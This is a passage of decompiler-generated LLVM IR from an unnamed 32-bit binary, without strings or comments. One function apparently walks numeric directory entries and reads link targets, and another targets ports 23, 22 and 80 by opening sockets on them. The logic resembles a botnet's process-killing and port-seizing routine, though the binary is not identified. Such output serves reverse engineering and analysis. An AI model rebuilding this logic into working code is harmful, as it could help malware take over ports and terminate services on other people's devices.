  br i1 %tmp64, label %dec_label_pc_10006490, label %dec_label_pc_10006478

dec_label_pc_10006490:                            ; preds = %dec_label_pc_10006478, %dec_label_pc_10006460, %dec_label_pc_10006450
  %v1_10006490 = phi i32 [ %v1_10006498.lcssa, %dec_label_pc_10006460 ], [ %v1_10006498.lcssa, %dec_label_pc_10006450 ], [ %v1_1000647c, %dec_label_pc_10006478 ]
  %v2_10006490 = add i32 %v1_10006490, %v0_10006450
  %v2_10006498 = add i32 %v1_10006498.lcssa, %v0_100063ec.pre
  store i32 %v2_10006498, i32* @r31, align 4
  %v3_1000649c = add i32 %v2_10006490, 32
  %v4_1000649c = inttoptr i32 %v3_1000649c to i8*
  store i8 0, i8* %v4_1000649c, align 1
  %v0_100064a0 = load i32, i32* @r31, align 4
  store i32 268461224, i32* @lr, align 4
  %v1_100064a4 = inttoptr i32 %v0_100064a0 to i8*
  %v2_100064a4 = call i32 @function_1000ab64(i8* %v1_100064a4)
  %v2_100064a8 = icmp sgt i32 %v2_100064a4, 15
  br i1 %v2_100064a8, label %dec_label_pc_10006304.backedge, label %dec_label_pc_100064b0

dec_label_pc_100064b0:                            ; preds = %dec_label_pc_10006490
  %v0_100064b0 = load i32, i32* @r31, align 4
  store i32 %v2_10006300, i32* @r3, align 4
  %v2_100064b8 = bitcast i32* %stack_var_-8792 to i8*
  %v3_100064b8 = call i32 @function_1000ab8c(i8* %v2_100064b8, i32 %v0_100064b0)
  br label %dec_label_pc_100064bc

dec_label_pc_100064bc.loopexit:                   ; preds = %dec_label_pc_10006304.backedge, %dec_label_pc_10006300
  %.pre = bitcast i32* %stack_var_-8792 to i8*
  br label %dec_label_pc_100064bc

dec_label_pc_100064bc:                            ; preds = %dec_label_pc_100064bc.loopexit, %dec_label_pc_100064b0
  %v1_100064c8.pre-phi = phi i8* [ %.pre, %dec_label_pc_100064bc.loopexit ], [ %v2_100064b8, %dec_label_pc_100064b0 ]
  store i32 268461252, i32* @lr, align 4
  %v0_100064c0 = call i32 @function_1000b3f0()
  store i32 268461260, i32* @lr, align 4
  %v2_100064c8 = call i32 @function_1000ab64(i8* %v1_100064c8.pre-phi)
  %v3_100064cc = icmp eq i32 %v2_100064c8, 0
  br i1 %v3_100064cc, label %dec_label_pc_10006794, label %dec_label_pc_100064d4

dec_label_pc_100064d4:                            ; preds = %dec_label_pc_100064bc
  %v3_100064dc = call i32 @function_1000a238(i32 6, i32* null)
  store i32 0, i32* %r31.global-to-local, align 4
  store i32 268461288, i32* @lr, align 4
  %v1_100064e4 = call i32 @function_1000b93c(i32 %v3_100064dc)
  store i32 %v1_100064e4, i32* @r23, align 4
  %v3_100064e8 = icmp eq i32 %v1_100064e4, 0
  br i1 %v3_100064e8, label %dec_label_pc_1000671c, label %dec_label_pc_100064f0

dec_label_pc_100064f0:                            ; preds = %dec_label_pc_100064d4
  store i32 0, i32* @r28, align 4
  store i32 268461308, i32* @lr, align 4
  %v1_100064f87 = inttoptr i32 %v1_100064e4 to i32*
  %v2_100064f88 = call i32 @function_1000ba4c(i32* %v1_100064f87)
  %v3_100064fc11 = icmp eq i32 %v2_100064f88, 0
  br i1 %v3_100064fc11, label %dec_label_pc_10006710, label %dec_label_pc_10006504.preheader.lr.ph

dec_label_pc_10006504.preheader.lr.ph:            ; preds = %dec_label_pc_100064f0
  %v2_10006538 = bitcast i32* %stack_var_-8247 to i8*
  %v1_100066a8 = bitcast i32* %stack_var_-4151 to i8*
  br label %dec_label_pc_10006504.preheader

dec_label_pc_100064f4.loopexit:                   ; preds = %dec_label_pc_1000650c, %dec_label_pc_10006524, %dec_label_pc_1000658c
  %v0_100064f4 = load i32, i32* @r23, align 4
  store i32 268461308, i32* @lr, align 4
  %v1_100064f8 = inttoptr i32 %v0_100064f4 to i32*
  %v2_100064f8 = call i32 @function_1000ba4c(i32* %v1_100064f8)
  %v3_100064fc = icmp eq i32 %v2_100064f8, 0
  br i1 %v3_100064fc, label %dec_label_pc_10006710, label %dec_label_pc_10006504.preheader

dec_label_pc_10006504.preheader:                  ; preds = %dec_label_pc_10006504.preheader.lr.ph, %dec_label_pc_100064f4.loopexit
  %v0_1000650c35 = phi i32 [ %v2_100064f88, %dec_label_pc_10006504.preheader.lr.ph ], [ %v2_100064f8, %dec_label_pc_100064f4.loopexit ]
  br label %dec_label_pc_10006504

dec_label_pc_10006504:                            ; preds = %dec_label_pc_10006504.preheader, %dec_label_pc_100066f8
  %v0_1000650c = phi i32 [ %v0_1000650c35, %dec_label_pc_10006504.preheader ], [ %v2_10006704, %dec_label_pc_100066f8 ]
  %v0_10006504 = load i32, i32* @r28, align 4
  %v3_10006504 = icmp eq i32 %v0_10006504, 0
  br i1 %v3_10006504, label %dec_label_pc_1000650c, label %dec_label_pc_10006710

dec_label_pc_1000650c:                            ; preds = %dec_label_pc_10006504
  %v1_1000650c = add i32 %v0_1000650c, 11
  %v2_1000650c = inttoptr i32 %v1_1000650c to i8*
  %v3_1000650c = load i8, i8* %v2_1000650c, align 1
  %v4_1000650c = zext i8 %v3_1000650c to i32
  store i32 %v1_1000650c, i32* @r30, align 4
  %v1_10006514 = add nuw nsw i32 %v4_1000650c, 208
  %v1_10006518 = urem i32 %v1_10006514, 256
  %v2_1000651c = icmp ugt i32 %v1_10006518, 9
  br i1 %v2_1000651c, label %dec_label_pc_100064f4.loopexit, label %dec_label_pc_10006524

dec_label_pc_10006524:                            ; preds = %dec_label_pc_1000650c
  %v3_1000652c = call i32 @function_1000a238(i32 6, i32* null)
  store i32 %v2_10006230, i32* @r3, align 4
  %v3_10006538 = call i32 @function_1000ab8c(i8* %v2_10006538, i32 %v3_1000652c)
  store i32 268461380, i32* @lr, align 4
  %v2_10006540 = call i32 @function_1000ab64(i8* %v2_10006538)
  %v0_10006544 = load i32, i32* @r30, align 4
  %v0_10006548 = load i32, i32* @r27, align 4
  %v2_10006548 = add i32 %v0_10006548, %v2_10006540
  store i32 %v2_10006548, i32* @r3, align 4
  %v2_1000654c = inttoptr i32 %v2_10006548 to i8*
  %v3_1000654c = call i32 @function_1000ab8c(i8* %v2_1000654c, i32 %v0_10006544)
  store i32 268461400, i32* @lr, align 4
  %v2_10006554 = call i32 @function_1000ab64(i8* %v2_10006538)
  %v3_10006564 = call i32 @function_1000a238(i32 7, i32* null)
  %v0_1000656c = load i32, i32* @r27, align 4
  %v2_1000656c = add i32 %v2_10006554, %v0_1000656c
  store i32 %v2_1000656c, i32* @r3, align 4
  %v2_10006570 = inttoptr i32 %v2_1000656c to i8*
  %v3_10006570 = call i32 @function_1000ab8c(i8* %v2_10006570, i32 %v3_10006564)
  store i32 4096, i32* @r5, align 4
  store i32 268461444, i32* @lr, align 4
  %v3_10006580 = call i32 @function_1000b670(i32 %v2_10006230, i32 %v2_10006238, i32 4096)
  %v3_10006584 = icmp eq i32 %v3_10006580, -1
  br i1 %v3_10006584, label %dec_label_pc_100064f4.loopexit, label %dec_label_pc_1000658c

dec_label_pc_1000658c:                            ; preds = %dec_label_pc_10006524
  %v3_10006594 = call i32 @function_1000a238(i32 6, i32* null)
  store i32 %v2_10006230, i32* @r3, align 4
  %v3_100065a0 = call i32 @function_1000ab8c(i8* %v2_10006538, i32 %v3_10006594)
  store i32 268461484, i32* @lr, align 4
  %v2_100065a8 = call i32 @function_1000ab64(i8* %v2_10006538)
  %v0_100065ac = load i32, i32* @r30, align 4
  %v0_100065b0 = load i32, i32* @r27, align 4
  %v2_100065b0 = add i32 %v0_100065b0, %v2_100065a8
  store i32 %v2_100065b0, i32* @r3, align 4
  %v2_100065b4 = inttoptr i32 %v2_100065b0 to i8*
  %v3_100065b4 = call i32 @function_1000ab8c(i8* %v2_100065b4, i32 %v0_100065ac)
  store i32 268461504, i32* @lr, align 4
  %v2_100065bc = call i32 @function_1000ab64(i8* %v2_10006538)
  %v3_100065cc = call i32 @function_1000a238(i32 9, i32* null)
  %v0_100065d4 = load i32, i32* @r27, align 4
  %v2_100065d4 = add i32 %v2_100065bc, %v0_100065d4
  store i32 %v2_100065d4, i32* @r3, align 4
  %v2_100065d8 = inttoptr i32 %v2_100065d4 to i8*
  %v3_100065d8 = call i32 @function_1000ab8c(i8* %v2_100065d8, i32 %v3_100065cc)
  store i32 268461540, i32* @lr, align 4
  %v1_100065e0 = call i32 @function_1000b93c(i32 %v2_10006230)
  store i32 %v1_100065e0, i32* @r25, align 4
  %v3_100065e4 = icmp eq i32 %v1_100065e0, 0
  br i1 %v3_100065e4, label %dec_label_pc_100064f4.loopexit, label %dec_label_pc_100065ec

dec_label_pc_100065ec.loopexit:                   ; preds = %dec_label_pc_1000660c, %dec_label_pc_100066a8
  %v0_100065ec.pre = load i32, i32* @r25, align 4
  br label %dec_label_pc_100065ec

dec_label_pc_100065ec:                            ; preds = %dec_label_pc_1000658c, %dec_label_pc_100065ec.loopexit
  %v0_100065ec = phi i32 [ %v0_100065ec.pre, %dec_label_pc_100065ec.loopexit ], [ %v1_100065e0, %dec_label_pc_1000658c ]
  store i32 268461556, i32* @lr, align 4
  %v1_100065f0 = inttoptr i32 %v0_100065ec to i32*
  %v2_100065f0 = call i32 @function_1000ba4c(i32* %v1_100065f0)
  store i32 4096, i32* @r4, align 4
  store i32 %v2_100065f0, i32* @r31, align 4
  %v3_100065f8 = icmp eq i32 %v2_100065f0, 0
  %v0_100065fc = load i32, i32* @r28, align 4
  store i32 %v2_10006238, i32* @r3, align 4
  %v3_100065fc.not = icmp ne i32 %v0_100065fc, 0
  %brmerge = or i1 %v3_100065f8, %v3_100065fc.not
  br i1 %brmerge, label %dec_label_pc_100066f8, label %dec_label_pc_1000660c

dec_label_pc_1000660c:                            ; preds = %dec_label_pc_100065ec
  store i32 268461584, i32* @lr, align 4
  %v0_1000660c = call i32 @function_1000ac0c()
  %v3_10006618 = call i32 @function_1000a238(i32 6, i32* null)
  store i32 %v2_10006230, i32* @r3, align 4
  %v3_10006624 = call i32 @function_1000ab8c(i8* %v2_10006538, i32 %v3_10006618)
  store i32 268461616, i32* @lr, align 4
  %v2_1000662c = call i32 @function_1000ab64(i8* %v2_10006538)
  %v0_10006630 = load i32, i32* @r30, align 4
  %v0_10006634 = load i32, i32* @r27, align 4
  %v2_10006634 = add i32 %v0_10006634, %v2_1000662c
  store i32 %v2_10006634, i32* @r3, align 4
  %v2_10006638 = inttoptr i32 %v2_10006634 to i8*
  %v3_10006638 = call i32 @function_1000ab8c(i8* %v2_10006638, i32 %v0_10006630)
  store i32 268461636, i32* @lr, align 4
  %v2_10006640 = call i32 @function_1000ab64(i8* %v2_10006538)
  %v3_10006650 = call i32 @function_1000a238(i32 9, i32* null)
  %v0_10006658 = load i32, i32* @r27, align 4
  %v2_10006658 = add i32 %v2_10006640, %v0_10006658
  store i32 %v2_10006658, i32* @r3, align 4
  %v2_1000665c = inttoptr i32 %v2_10006658 to i8*
  %v3_1000665c = call i32 @function_1000ab8c(i8* %v2_1000665c, i32 %v3_10006650)
  store i32 268461672, i32* @lr, align 4
  %v2_10006664 = call i32 @function_1000ab64(i8* %v2_10006538)
  %v0_10006670 = load i32, i32* @r27, align 4
  %v2_10006670 = add i32 %v0_10006670, %v2_10006664
  store i32 %v2_10006670, i32* @r3, align 4
  %v2_10006674 = inttoptr i32 %v2_10006670 to i8*
  %v3_10006674 = call i32 @function_1000ab8c(i8* %v2_10006674, i32 ptrtoint (i32* @global_var_1000de44.8 to i32))
  store i32 268461696, i32* @lr, align 4
  %v2_1000667c = call i32 @function_1000ab64(i8* %v2_10006538)
  %v0_10006680 = load i32, i32* @r31, align 4
  %v1_10006680 = add i32 %v0_10006680, 11
  %v0_10006684 = load i32, i32* @r27, align 4
  %v2_10006684 = add i32 %v0_10006684, %v2_1000667c
  store i32 %v2_10006684, i32* @r3, align 4
  %v2_10006688 = inttoptr i32 %v2_10006684 to i8*
  %v3_10006688 = call i32 @function_1000ab8c(i8* %v2_10006688, i32 %v1_10006680)
  store i32 268461724, i32* @lr, align 4
  %v3_10006698 = call i32 @function_1000b670(i32 %v2_10006230, i32 %v2_10006238, i32 4096)
  %v3_1000669c = icmp eq i32 %v3_10006698, -1
  br i1 %v3_1000669c, label %dec_label_pc_100065ec.loopexit, label %dec_label_pc_100066a8

dec_label_pc_100066a8:                            ; preds = %dec_label_pc_1000660c
  store i32 268461740, i32* @lr, align 4
  %v2_100066a8 = call i32 @function_1000ab64(i8* %v1_100066a8)
  %v4_100066b8 = call i32 @function_1000af14(i8* %v1_100066a8, i32 %v2_100066a8, i32 %v2_10006300)
  %v3_100066c0 = icmp eq i32 %v4_100066b8, -1
  %v0_100066c4 = load i32, i32* @r30, align 4
  store i32 %v0_100066c4, i32* @r3, align 4
  br i1 %v3_100066c0, label %dec_label_pc_100065ec.loopexit, label %dec_label_pc_100066cc

dec_label_pc_100066cc:                            ; preds = %dec_label_pc_100066a8
  store i32 268461776, i32* @lr, align 4
  %v2_100066cc = call i32 @function_1000ac8c(i32 %v0_100066c4, i32 10)
  store i32 268461784, i32* @lr, align 4
  %v2_100066d4 = call i32 @function_1000b510(i32 %v2_100066cc, i32 9)
  %v0_100066d8 = load i32, i32* @r25, align 4
  store i32 268461792, i32* @lr, align 4
  %v1_100066dc = inttoptr i32 %v0_100066d8 to i32*
  %v2_100066dc = call i32 @function_1000ba4c(i32* %v1_100066dc)
  store i32 1, i32* @r28, align 4
  store i32 %v2_100066dc, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100066f8

dec_label_pc_100066f8:                            ; preds = %dec_label_pc_100065ec, %dec_label_pc_100066cc
  %v0_100066f8 = load i32, i32* @r25, align 4
  store i32 268461824, i32* @lr, align 4
  %v1_100066fc = inttoptr i32 %v0_100066f8 to i32*
  %v2_100066fc = call i32 @function_1000b898(i32* %v1_100066fc)
  %v0_10006700 = load i32, i32* @r23, align 4
  store i32 268461832, i32* @lr, align 4
  %v1_10006704 = inttoptr i32 %v0_10006700 to i32*
  %v2_10006704 = call i32 @function_1000ba4c(i32* %v1_10006704)
  %v3_10006708 = icmp eq i32 %v2_10006704, 0
  br i1 %v3_10006708, label %dec_label_pc_10006710, label %dec_label_pc_10006504

dec_label_pc_10006710:                            ; preds = %dec_label_pc_100064f4.loopexit, %dec_label_pc_100066f8, %dec_label_pc_10006504, %dec_label_pc_100064f0
  %v0_10006710 = load i32, i32* @r23, align 4
  %v0_10006714 = load i32, i32* @r28, align 4
  %v1_10006714 = urem i32 %v0_10006714, 256
  store i32 %v1_10006714, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000671c.88 to i32), i32* @lr, align 4
  %v1_10006718 = inttoptr i32 %v0_10006710 to i32*
  %v2_10006718 = call i32 @function_1000b898(i32* %v1_10006718)
  br label %dec_label_pc_1000671c

dec_label_pc_1000671c:                            ; preds = %dec_label_pc_100064d4, %dec_label_pc_10006710
  store i32 ptrtoint ([3 x i8]* @global_var_10006724.89 to i32), i32* @lr, align 4
  %v1_10006720 = call i32 @function_1000cce4(i32 1)
  store i32 ptrtoint ([3 x i8]* @global_var_1000672c.90 to i32), i32* @lr, align 4
  %v1_10006728 = call i32 @function_1000a260(i32 6)
  store i32 ptrtoint ([3 x i8]* @global_var_10006734.91 to i32), i32* @lr, align 4
  %v1_10006730 = call i32 @function_1000a260(i32 7)
  store i32 268461884, i32* @lr, align 4
  %v1_10006738 = call i32 @function_1000a260(i32 9)
  br label %dec_label_pc_1000673c

dec_label_pc_1000673c:                            ; preds = %dec_label_pc_100062c4, %dec_label_pc_1000671c
  %v0_10006740 = load i32, i32* @r31, align 4
  store i32 %v0_10006264, i32* @r23, align 4
  store i32 %v0_1000624c, i32* @r25, align 4
  store i32 %v0_1000622c, i32* @r27, align 4
  store i32 %v0_1000626c, i32* @r28, align 4
  store i32 %v0_1000623c, i32* @r29, align 4
  store i32 %v0_10006254, i32* @r30, align 4
  store i32 %v0_1000625c, i32* @r31, align 4
  ret i32 %v0_10006740

dec_label_pc_10006774:                            ; preds = %dec_label_pc_10006400
  %v3_10006400 = icmp eq i32 %v0_1000643475, 0
  %v1_10006774 = add i32 %v0_1000643475, 1
  br i1 %v3_10006400, label %dec_label_pc_1000677c, label %dec_label_pc_10006408

dec_label_pc_1000677c:                            ; preds = %dec_label_pc_10006774
  %v0_1000677c = load i32, i32* %r26.global-to-local, align 4
  %v2_1000677c = add i32 %v0_1000677c, %v1_1000649877
  %v1_10006780 = add i32 %v2_1000677c, 33
  %v2_10006780 = inttoptr i32 %v1_10006780 to i8*
  %v3_10006780 = load i8, i8* %v2_10006780, align 1
  %v3_10006784 = icmp eq i8 %v3_10006780, 65
  br i1 %v3_10006784, label %dec_label_pc_1000678c, label %dec_label_pc_100063e4

dec_label_pc_1000678c:                            ; preds = %dec_label_pc_1000677c
  br label %dec_label_pc_100063e4.outer

dec_label_pc_10006794:                            ; preds = %dec_label_pc_100064bc
  store i32 0, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100067a0.92 to i32), i32* @lr, align 4
  %v1_1000679c = call i32 @function_1000a260(i32 6)
  store i32 ptrtoint ([3 x i8]* @global_var_100067a8.93 to i32), i32* @lr, align 4
  %v1_100067a4 = call i32 @function_1000a260(i32 7)
  store i32 268462000, i32* @lr, align 4
  %v1_100067ac = call i32 @function_1000a260(i32 9)
  %v0_100067b4 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10006264, i32* @r23, align 4
  store i32 %v0_1000624c, i32* @r25, align 4
  store i32 %v0_1000622c, i32* @r27, align 4
  store i32 %v0_1000626c, i32* @r28, align 4
  store i32 %v0_1000623c, i32* @r29, align 4
  store i32 %v0_10006254, i32* @r30, align 4
  store i32 %v0_1000625c, i32* @r31, align 4
  ret i32 %v0_100067b4

dec_label_pc_100067e8:                            ; preds = %dec_label_pc_1000621c
  store i8 48, i8* %stack_var_-8776, align 1
  br label %dec_label_pc_100062c4

; uselistorder directives
  uselistorder i32 %v2_10006704, { 1, 0 }
  uselistorder i32 %v1_10006498.lcssa, { 5, 3, 2, 1, 0, 4 }
  uselistorder i32 %v0_1000643475, { 2, 0, 4, 1, 3 }
  uselistorder i32 %v1_1000649877, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_1000641822, { 1, 0 }
  uselistorder i32 %v1_100063b4, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_10006300, { 1, 0, 2 }
  uselistorder i32 %v2_10006250, { 1, 0 }
  uselistorder i32 %v2_10006230, { 1, 2, 3, 4, 5, 6, 0, 7 }
  uselistorder i8* %stack_var_-8776, { 2, 0, 1 }
  uselistorder i8* %stack_var_-8760, { 1, 3, 0, 2 }
  uselistorder i32* %stack_var_-8792, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @function_1000ac8c, { 4, 3, 2, 1, 0 }
  uselistorder i32 268461308, { 1, 0 }
  uselistorder i8 58, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_1000adc4, { 1, 0 }
  uselistorder i32 268460820, { 1, 0 }
  uselistorder label %dec_label_pc_1000673c, { 1, 0 }
  uselistorder label %dec_label_pc_1000671c, { 1, 0 }
  uselistorder label %dec_label_pc_10006710, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_100066f8, { 1, 0 }
  uselistorder label %dec_label_pc_100065ec, { 1, 0 }
  uselistorder label %dec_label_pc_100065ec.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_10006504, { 1, 0 }
  uselistorder label %dec_label_pc_10006504.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100064f4.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10006444, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10006430, { 1, 0 }
  uselistorder label %dec_label_pc_10006408, { 1, 0 }
  uselistorder label %dec_label_pc_100063e4, { 1, 0 }
  uselistorder label %dec_label_pc_100063ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000635c, { 1, 0 }
  uselistorder label %dec_label_pc_10006304.backedge, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1000631c, { 1, 0 }
  uselistorder label %dec_label_pc_100062c4, { 1, 0 }
}

define i32 @function_1000680c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000680c:
  %r11.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-8440 = alloca i32, align 4
  %stack_var_-8456 = alloca i32, align 4
  %stack_var_-8444 = alloca i32, align 4
  %stack_var_-8448 = alloca i32, align 4
  %stack_var_-8452 = alloca i32, align 4
  %stack_var_-8276 = alloca i32, align 4
  %stack_var_-8340 = alloca i32, align 4
  %stack_var_-8404 = alloca i32, align 4
  %stack_var_-8420 = alloca i32, align 4
  %stack_var_-4180 = alloca i32, align 4
  %stack_var_-8436 = alloca i32, align 4
  %v0_10006818 = load i32, i32* @r28, align 4
  %v0_10006834 = load i32, i32* @r22, align 4
  %v0_10006838 = load i32, i32* @r23, align 4
  %v0_10006848 = load i32, i32* @r27, align 4
  %v0_1000684c = load i32, i32* @r29, align 4
  %v0_10006850 = load i32, i32* @r30, align 4
  %v0_10006854 = load i32, i32* @r31, align 4
  store i32 268462172, i32* @lr, align 4
  %v0_10006858 = call i32 @function_1000b7c0()
  store i32 %v0_10006858, i32* @r28, align 4
  store i32 268462180, i32* @lr, align 4
  %v0_10006860 = call i32 @function_1000b438()
  store i32 %v0_10006860, i32* @global_var_1001eb24.83, align 4
  %tmp85 = icmp slt i32 %v0_10006860, 1
  br i1 %tmp85, label %dec_label_pc_100068c0, label %dec_label_pc_10006874

dec_label_pc_10006874:                            ; preds = %dec_label_pc_10006aac, %dec_label_pc_100069a4, %dec_label_pc_100068c0, %dec_label_pc_1000680c
  %v0_100068bc = phi i32 [ -1, %dec_label_pc_100069a4 ], [ -1, %dec_label_pc_100068c0 ], [ %v0_10006860, %dec_label_pc_1000680c ], [ 0, %dec_label_pc_10006aac ]
  store i32 %v0_10006834, i32* @r22, align 4
  store i32 %v0_10006838, i32* @r23, align 4
  store i32 %v0_10006848, i32* @r27, align 4
  store i32 %v0_10006818, i32* %r28.global-to-local, align 4
  store i32 %v0_1000684c, i32* @r29, align 4
  store i32 %v0_10006850, i32* @r30, align 4
  store i32 %v0_10006854, i32* @r31, align 4
  ret i32 %v0_100068bc

dec_label_pc_100068c0:                            ; preds = %dec_label_pc_1000680c
  %v3_100068c0 = icmp eq i32 %v0_10006860, -1
  br i1 %v3_100068c0, label %dec_label_pc_10006874, label %dec_label_pc_100068c8

dec_label_pc_100068c8:                            ; preds = %dec_label_pc_100068c0
  store i32 0, i32* @r30, align 4
  store i32 2, i32* %stack_var_-8436, align 4
  store i32 ptrtoint (i32* @global_var_100068e0.94 to i32), i32* @lr, align 4
  %v1_100068dc = call i32 @function_1000621c(i32 23)
  store i32 268462328, i32* @lr, align 4
  %v3_100068f4 = call i32 @function_1000c1bc(i32 2, i32 1, i32 0)
  %v3_100068f8 = icmp eq i32 %v3_100068f4, -1
  store i32 %v3_100068f4, i32* @r31, align 4
  br i1 %v3_100068f8, label %dec_label_pc_1000691c, label %dec_label_pc_10006904

dec_label_pc_10006904:                            ; preds = %dec_label_pc_100068c8
  %v2_10006904 = ptrtoint i32* %stack_var_-8436 to i32
  store i32 268462352, i32* @lr, align 4
  %v3_1000690c = call i32 @function_1000bf88(i32 %v2_10006904, i32 16, i32 16)
  %v0_10006910 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000691c.95 to i32), i32* @lr, align 4
  %v2_10006918 = call i32 @function_1000c060(i32 %v0_10006910, i32 1)
  br label %dec_label_pc_1000691c

dec_label_pc_1000691c:                            ; preds = %dec_label_pc_100068c8, %dec_label_pc_10006904
  store i32 ptrtoint (i32* @global_var_10006924.96 to i32), i32* @lr, align 4
  %v1_10006920 = call i32 @function_1000621c(i32 22)
  store i32 268462396, i32* @lr, align 4
  %v3_10006938 = call i32 @function_1000c1bc(i32 2, i32 1, i32 0)
  %v3_1000693c = icmp eq i32 %v3_10006938, -1
  store i32 %v3_10006938, i32* @r31, align 4
  br i1 %v3_1000693c, label %dec_label_pc_10006960, label %dec_label_pc_10006948

dec_label_pc_10006948:                            ; preds = %dec_label_pc_1000691c
  %v2_10006948 = ptrtoint i32* %stack_var_-8436 to i32
  store i32 268462420, i32* @lr, align 4
  %v3_10006950 = call i32 @function_1000bf88(i32 %v2_10006948, i32 16, i32 16)
  %v0_10006954 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006960.97 to i32), i32* @lr, align 4
  %v2_1000695c = call i32 @function_1000c060(i32 %v0_10006954, i32 1)
  br label %dec_label_pc_10006960

dec_label_pc_10006960:                            ; preds = %dec_label_pc_1000691c, %dec_label_pc_10006948
  store i32 ptrtoint (i32* @global_var_10006968.98 to i32), i32* @lr, align 4
  %v1_10006964 = call i32 @function_1000621c(i32 80)
  store i32 268462464, i32* @lr, align 4
  %v3_1000697c = call i32 @function_1000c1bc(i32 2, i32 1, i32 0)
  %v3_10006980 = icmp eq i32 %v3_1000697c, -1
  store i32 %v3_1000697c, i32* @r31, align 4
  br i1 %v3_10006980, label %dec_label_pc_100069a4, label %dec_label_pc_1000698c

dec_label_pc_1000698c:                            ; preds = %dec_label_pc_10006960
  %v2_1000698c = ptrtoint i32* %stack_var_-8436 to i32
  store i32 268462488, i32* @lr, align 4
  %v3_10006994 = call i32 @function_1000bf88(i32 %v2_1000698c, i32 16, i32 16)
  %v0_10006998 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100069a4.99 to i32), i32* @lr, align 4
  %v2_100069a0 = call i32 @function_1000c060(i32 %v0_10006998, i32 1)
  br label %dec_label_pc_100069a4

dec_label_pc_100069a4:                            ; preds = %dec_label_pc_10006960, %dec_label_pc_1000698c
  store i32 268462512, i32* @lr, align 4
  %v1_100069ac = call i32 @function_1000cce4(i32 5)
  store i32 4096, i32* @r3, align 4
  store i32 268462520, i32* @lr, align 4
  %v0_100069b4 = call i32 @function_1000c3f0()
  store i32 %v0_100069b4, i32* %r11.global-to-local, align 4
  %v0_100069c4 = load i32, i32* @r30, align 4
  %v1_100069c4 = trunc i32 %v0_100069c4 to i8
  %v3_100069c4 = inttoptr i32 %v0_100069b4 to i8*
  store i8 %v1_100069c4, i8* %v3_100069c4, align 1
  %v2_100069c8 = ptrtoint i32* %stack_var_-4180 to i32
  store i32 %v2_100069c8, i32* %r21.global-to-local, align 4
  %v0_100069cc = load i32, i32* @r30, align 4
  store i32 %v0_100069cc, i32* @global_var_1001eb1c.100, align 4
  %v0_100069d0 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100069d0, i32* @global_var_1001eb20.101, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100069d8.102 to i32), i32* @lr, align 4
  %v1_100069d4 = call i32 @function_1000a2ec(i32 6)
  store i32 268462560, i32* @lr, align 4
  %v1_100069dc = call i32 @function_1000a2ec(i32 7)
  %v3_100069e8 = call i32 @function_1000a238(i32 6, i32* null)
  store i32 %v2_100069c8, i32* @r3, align 4
  %v2_100069f4 = bitcast i32* %stack_var_-4180 to i8*
  %v3_100069f4 = call i32 @function_1000ab8c(i8* %v2_100069f4, i32 %v3_100069e8)
  %v0_100069f8 = load i32, i32* %r21.global-to-local, align 4
  %v2_100069f8 = add i32 %v0_100069f8, %v3_100069f4
  store i32 %v2_100069f8, i32* %r29.global-to-local, align 4
  store i32 268462592, i32* @lr, align 4
  %v0_100069fc = call i32 @function_1000b480()
  %v2_10006a00 = ptrtoint i32* %stack_var_-8420 to i32
  %v3_10006a08 = trunc i32 %v0_100069fc to i8
  %v4_10006a08 = call i32 @function_1000b0c4(i8 %v3_10006a08, i32 10, i32 %v2_10006a00)
  store i32 %v2_100069f8, i32* @r3, align 4
  %v2_10006a14 = inttoptr i32 %v2_100069f8 to i8*
  %v3_10006a14 = call i32 @function_1000ab8c(i8* %v2_10006a14, i32 %v4_10006a08)
  %v0_10006a1c = load i32, i32* %r29.global-to-local, align 4
  %v2_10006a1c = add i32 %v0_10006a1c, %v3_10006a14
  store i32 %v2_10006a1c, i32* %r29.global-to-local, align 4
  %v3_10006a24 = call i32 @function_1000a238(i32 7, i32* null)
  store i32 %v2_10006a1c, i32* @r3, align 4
  %v2_10006a30 = inttoptr i32 %v2_10006a1c to i8*
  %v3_10006a30 = call i32 @function_1000ab8c(i8* %v2_10006a30, i32 %v3_10006a24)
  store i32 %v3_10006a30, i32* @r31, align 4
  store i32 268462664, i32* @lr, align 4
  %v2_10006a44 = call i32 @function_1000b558(i32 %v2_100069c8, i32 0)
  %v3_10006a48 = icmp eq i32 %v2_10006a44, -1
  br i1 %v3_10006a48, label %dec_label_pc_10006874, label %dec_label_pc_10006a50

dec_label_pc_10006a50:                            ; preds = %dec_label_pc_100069a4
  store i32 ptrtoint ([3 x i8]* @global_var_10006a54.103 to i32), i32* @lr, align 4
  %v0_10006a50 = call i32 @function_1000b3f0()
  store i32 ptrtoint ([3 x i8]* @global_var_10006a5c.104 to i32), i32* @lr, align 4
  %v1_10006a58 = call i32 @function_1000a260(i32 6)
  store i32 268462692, i32* @lr, align 4
  %v1_10006a60 = call i32 @function_1000a260(i32 7)
  %v3_10006a64 = load i32, i32* @global_var_1001eb20.101, align 4
  store i32 268462708, i32* @lr, align 4
